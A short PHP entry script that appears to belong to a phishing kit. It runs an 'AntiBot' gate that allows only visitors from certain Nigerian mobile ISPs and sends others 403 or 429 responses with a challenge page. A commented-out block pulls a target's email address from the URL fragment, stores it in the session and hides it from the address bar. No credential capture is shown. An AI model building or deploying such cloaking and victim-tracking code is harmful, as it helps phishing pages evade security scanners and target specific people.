<?php
session_start();
require dirname(__FILE__) . '/antibot.php';

// configuration for the anti‑bot guard
$config = array(
    'isp_allow_keywords' => array('mtn','glo','airtel','9mobile'),
    'cidr_blacklist' => array(),
    'ip_blacklist' => array(),
    'log_path' => dirname(__FILE__) . '/antibot.log',
);

$gate = new AntiBot($config);
$decision = $gate->enforce();

if ($decision['action'] === 'block') {
    if (function_exists('http_response_code')) {
        http_response_code(403);
    } else {
        header("HTTP/1.1 403 Forbidden");
    }
    include dirname(__FILE__) . '/challenge.html';
    exit;
}

if ($decision['action'] === 'challenge') {
    if (function_exists('http_response_code')) {
        http_response_code(429);
    } else {
        header("HTTP/1.1 429 Too Many Requests");
    }
    include dirname(__FILE__) . '/challenge.html';
    exit;
}

// email handling: the server can't see the fragment (#) so we use a quick
// client‑side redirect on the first hit, then remember the validated address in
// the session so later reloads work with only the fragment.
// $emailValidated = isset($_SESSION['email_validated']) ? $_SESSION['email_validated'] : null;

// if (isset($_GET['email'])) {
//     // decode because our redirect encoded the hash value
//     $email = rawurldecode($_GET['email']);
//     // simple validation – adjust as needed
//     if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
//         $_SESSION['email_validated'] = $email;
//         $emailValidated = $email;
//         // after serving this request we will strip the query string via JS
//         echo '<script>if(window.location.search.indexOf("email=")!==-1 && window.location.hash){history.replaceState(null,"",window.location.pathname+window.location.hash);}</script>';
//     } else {
//         // invalid email, show nothing
//         exit;
//     }
// } elseif (!$emailValidated) {
//     // first hit and nothing in session – ask the browser to resend the value
//     echo '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Redirecting</title></head><body>';
//     echo '<script>' .
//          'var hash = window.location.hash;' .
//          'if(hash && hash.length>1) {' .
//          '  var email = encodeURIComponent(hash.substring(1));' .
//          '  window.location.href = window.location.pathname + "?email=" + email + hash;' .
//          '}' .
//          '</script>';
//     echo '</body></html>';
//     exit;
// }

